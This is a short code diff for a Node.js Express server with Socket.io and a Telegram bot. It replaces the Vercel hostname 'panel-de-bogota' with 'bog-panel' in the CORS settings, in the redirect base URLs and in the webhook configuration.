@@ -41,7 +41,7 @@ app.use(express.json());
 
 // Configurar cabeceras CORS
 app.use((req, res, next) => {
-    const origin = process.env.VERCEL === '1' ? 'https://panel-de-bogota.vercel.app' : '*';
+    const origin = process.env.VERCEL === '1' ? 'https://bog-panel.vercel.app' : '*';
     res.setHeader('Access-Control-Allow-Origin', origin);
     res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
@@ -182,7 +182,7 @@ io.on('connection', (socket) => {
             console.log(`Procesando acción ${action} para mensaje ${messageId}`);
 
             const isVercel = process.env.VERCEL === '1';
-            const baseUrl = isVercel ? 'https://panel-de-bogota.vercel.app' : 'http://localhost:3000';
+            const baseUrl = isVercel ? 'https://bog-panel.vercel.app' : 'http://localhost:3000';
             const { message, url } = handleRedirect(action, baseUrl);
 
             socket.emit('telegram_action', {
@@ -246,7 +246,7 @@ bot.on('callback_query', async (callbackQuery) => {
         
         // Configurar URL base según el entorno
         const isVercel = process.env.VERCEL === '1';
-        const baseUrl = isVercel ? 'https://panel-de-bogota.vercel.app' : 'http://localhost:3000';
+        const baseUrl = isVercel ? 'https://bog-panel.vercel.app' : 'http://localhost:3000';
 
         // Responder al callback query
         await bot.answerCallbackQuery(callbackQuery.id, {
@@ -326,7 +326,7 @@ const handler = async (req, res) => {
             console.log('Bot conectado exitosamente:', botInfo.username);
             
             if (process.env.VERCEL === '1') {
-                const webhookUrl = 'https://panel-de-bogota.vercel.app/api/webhook';
+                const webhookUrl = 'https://bog-panel.vercel.app/api/webhook';
                 await bot.setWebHook(webhookUrl);
                 console.log('Webhook configurado para:', webhookUrl);
             }
